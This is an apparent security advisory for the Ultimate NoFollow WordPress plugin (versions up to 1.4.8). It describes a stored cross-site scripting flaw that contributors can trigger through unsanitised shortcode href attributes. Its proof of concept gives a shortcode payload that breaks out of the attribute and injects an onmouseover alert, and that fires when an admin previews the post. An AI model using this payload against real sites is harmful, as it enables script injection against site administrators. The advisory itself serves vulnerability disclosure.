## WordPress Plugin Vulnerabilities

# Ultimate NoFollow <= 1.4.8 - Contributor+ Stored Cross-Site Scripting

### Description

The plugin does not sanitise and escape the href attribute of its shortcodes, allowing users with a role as low as contributor to perform Cross-Site Scripting attacks

### Proof of Concept

Affected shortcodes: nf, nofo, nofol, nofollow, relnofollow
As a contributor, put the below shortcode in a post/page
[nf href='https://test" style="position:absolute;top:0;left:0;max-width:9999px;width:9999px;height:9999px" onmouseover="alert(/XSS/)']test[/nf]
The XSS will be triggered when the post is previewed (for example by an admin when reviewed)/viewed

### Affects Plugins
